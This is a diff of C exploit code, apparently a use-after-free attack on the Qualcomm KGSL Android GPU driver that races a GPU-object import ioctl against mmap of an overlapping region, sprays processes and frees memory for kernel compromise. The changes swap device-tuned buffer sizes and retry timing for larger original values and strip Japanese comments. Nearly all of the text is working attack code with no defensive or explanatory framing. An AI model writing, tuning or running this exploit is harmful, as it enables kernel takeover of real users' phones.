@@ -22,7 +22,6 @@
 #include <sys/sem.h>
 #include <sys/shm.h>
 #include <sys/sysmacros.h>
-#include <sched.h>
 
 #define KGSL_IOC_TYPE 0x09
 
@@ -70,15 +69,14 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-// 環境に合わせてサイズを縮小（CMA制限を考慮）
 #define UAF_ADDR  0x7001ff000ULL
-#define UAF_SIZE  0x8000000ULL          // 128MB (元: 268MB)
+#define UAF_SIZE  0x10004000ULL
 #define OVERLAP_ADDR 0x7001fe000ULL
 #define OVERLAP_SIZE 0x7000ULL
 #define BOGUS_ADDR 0x700204000ULL
-#define BOGUS_SIZE 0x20000000ULL        // 512MB (元: ほぼ4GB)
+#define BOGUS_SIZE 0xffffffffffefd000ULL
 #define PLACEHOLDER_ADDR 0x710204000ULL
-#define PLACEHOLDER_SIZE 0x8000000ULL   // 128MB (元: 260MB)
+#define PLACEHOLDER_SIZE 0x10400000ULL
 
 #define SPRAY_PIDS 2000
 #define SCAN_DWORDS 560
@@ -196,10 +194,7 @@ static void *race_thread(void *arg) {
         .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
         .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
     };
-    while (!race_done) {
-        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
-        sched_yield();  // スレッド切り替えを促進
-    }
+    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
     return NULL;
 }
 
@@ -209,25 +204,14 @@ static bool phase2_race(void) {
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
 
     int hit = 0;
-    // 無限ループにして成功するまで待つ
-    for (int i = 0; ; i++) {
-        // タイミングを調整するために少し待つ
-        usleep(1);
+    for (int i = 0; i < 20000000; i++) {
         void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
             PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
             kgsl_fd, (off_t)ov_id << 12);
         int e = errno;
-        if (r != MAP_FAILED) {
-            munmap(r, OVERLAP_SIZE);
-            hit = 1;
-            break;
-        }
-        if (e == ENODEV) {
-            hit = 1;
-            break;
-        }
-        if (i % 500000 == 0) printf("  race %d iterations, errno=%d\n", i, e);
-        if (i > 20000000) break;  // タイムアウト
+        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
+        if (e == ENODEV) { hit = 1; break; }
+        if (i % 1000000 == 0) printf("  race %d/20000000 errno=%d\n", i, e);
     }
 
     race_done = 1;
@@ -440,7 +424,7 @@ static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
 
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] KGSL UAF Analyzer (SD630/Adreno508 optimized)\n");
+    printf("[*] KGSL UAF Analyzer\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
@@ -449,8 +433,7 @@ int main(int argc, char **argv) {
     printf("[*] Phase 1: rbtree setup\n");
     phase1_rbtree();
 
-    printf("[*] Phase 2: race (BOGUS_SIZE=0x%lx, BOGUS_ADDR=0x%lx)\n",
-           (unsigned long)BOGUS_SIZE, (unsigned long)BOGUS_ADDR);
+    printf("[*] Phase 2: race\n");
     if (!phase2_race()) { close(kgsl_fd); return 1; }
 
     printf("[*] Phase 3: free UAF\n");
